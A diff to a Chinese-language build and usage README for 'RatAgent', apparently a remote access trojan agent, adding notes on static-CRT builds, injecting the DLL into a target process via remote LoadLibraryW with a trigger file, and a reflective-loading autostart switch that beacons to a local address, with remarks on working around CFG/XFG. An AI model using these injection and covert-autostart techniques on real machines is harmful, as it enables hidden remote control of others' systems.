@@ -62,6 +62,9 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 "%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.dll
 ```
 
+> Debug / Release **都是静态 CRT `/MT`**（`dumpbin /dependents` 只有系统 DLL），Release 体积更小
+> （约 375 KB vs 1.9 MB），反射加载验证用的是 Release。指定 `-p:OutDir=` 时 Debug/Release 建议分目录。
+
 产物：`client/x64/Debug/RatAgent.exe` 与 `client/x64/Debug/RatAgent.dll`。
 
 > 受限环境（无 GUI/沙箱会话）下，既有 VS 输出目录可能不可写，改用工作区内新目录：
@@ -88,6 +91,12 @@ LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → 
 :: 3) 注入（远程 LoadLibrary + 触发器自启动）
 ::    先写好 %TEMP%\RatAgent\autostart.args（内容 = 参数串），再让目标进程远程 LoadLibraryW 本 DLL；
 ::    DllMain 检测到触发器即在自建线程上启动；删除该文件即关闭自启动。
+
+:: 4) 反射加载 / 其它没有参数通道的宿主（不落盘即自启）
+::    在加载进程的环境里设 RAT_AUTOSTART_DEFAULT=1，DllMain 后按**内置默认配置**自启
+::    （beacon 127.0.0.1:8080、轮询 5s；agent.id/日志落 %LOCALAPPDATA%\RatAgent\）。
+::    该开关**默认关闭**：不设置时行为与以前完全一致（rundll32 Stop / 宿主 StartAgent
+::    不会被抢跑）；若同时存在 autostart.args，仍以文件里的参数为准。
 ```
 
 > **为什么注入要这样**：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"
